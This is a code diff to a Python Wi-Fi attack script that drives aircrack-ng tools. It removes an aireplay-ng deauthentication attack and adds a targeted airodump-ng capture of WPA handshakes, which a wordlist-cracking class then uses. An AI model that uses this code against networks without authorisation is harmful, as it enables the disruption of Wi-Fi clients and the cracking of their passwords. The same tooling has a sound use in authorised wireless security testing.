@@ -1,7 +1,6 @@
 import subprocess
 import getmac
 
-
 class WordlistAttackTool:
     def __init__(self, handshake_file, wordlist_file):
         self.handshake_file = handshake_file
@@ -22,13 +21,6 @@ class WifiScan:
     def __init__(self, adapter):
         self.adapter = adapter
 
-    def deauth_attack(self, client_bssid, deauth_pack, client_mac):
-        '''Deauth attack function'''
-        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
-        subprocess.run(
-            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
-            check=True)
-
     def capture_handshake(self):
         """Capture WPA handshake"""
         print("Capturing handshake")
@@ -41,20 +33,20 @@ class WifiScan:
             # Start the capture process in the background
             capture_process = subprocess.Popen(['airodump-ng', self.adapter])
 
-            # Wait for user input to execute the deauth attack
-            input("Press Enter to proceed with deauth attack...")
-
-            # Prompt user for deauth attack inputs
-            client_bssid = input("[+] Input client BSSID: ")
-            deauth_pack = int(input("[+] Input number of deauth packets: "))
-            client_mac = getmac.get_mac_address(interface=self.adapter)
-
-            # Execute the deauth attack
-            print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
-            subprocess.run(['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter], check=True)
+            # Wait for user input to stop the capture process
+            input("Press Enter to stop the capture process...")
 
         except KeyboardInterrupt:
-            print("Capture handshake process stopped.")
+            channel = input("[+] Input channel of Wi-Fi network: ")
+            client_bssid = input("[+] Input client BSSID: ")
+            handshake_file = input("[+] Input handshake file name: ")
+            subprocess.run([
+                'airodump-ng',
+                '--bssid', client_bssid,
+                '--channel', channel,
+                '--write', handshake_file,
+                self.adapter
+            ])
 
         finally:
             # Cancel the capture process if it was started
